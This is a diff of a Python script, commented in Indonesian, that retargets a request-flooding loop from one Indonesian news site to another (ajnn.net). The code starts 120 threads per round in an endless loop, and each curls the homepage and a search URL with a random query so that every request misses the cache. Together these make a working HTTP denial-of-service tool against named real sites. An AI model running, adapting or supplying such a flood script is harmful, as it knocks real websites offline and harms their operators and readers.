@@ -10,10 +10,8 @@ import string
 
 # Daftar URL yang ingin di-curl (parameter s pada url kedua akan diganti dinamis)
 urls = [
-    "https://mitraberita.net/",
-    None,  # Placeholder untuk url dinamis
-    "https://mitraberita.net/?s=aceh&post_type=post",
-    "https://mitraberita.net/?s=apa+le&post_type=post"
+    "https://www.ajnn.net/",
+    None  # Placeholder untuk url dinamis
 ]
 
 def random_string(length=8):
@@ -34,12 +32,10 @@ def run_curl_perdetik():
     while True:
         threads = []
         for _ in range(120):
-            # Buat url dinamis untuk parameter s SETIAP request (bukan per detik)
+            # Buat url dinamis untuk parameter q SETIAP request (bukan per detik)
             current_urls = [
                 urls[0],
-                f"https://mitraberita.net/?s={random_string()}",
-                urls[2],
-                urls[3]
+                f"https://www.ajnn.net/search/?q={random_string()}"
             ]
             for url in current_urls:
                 t = threading.Thread(target=curl, args=(url,))
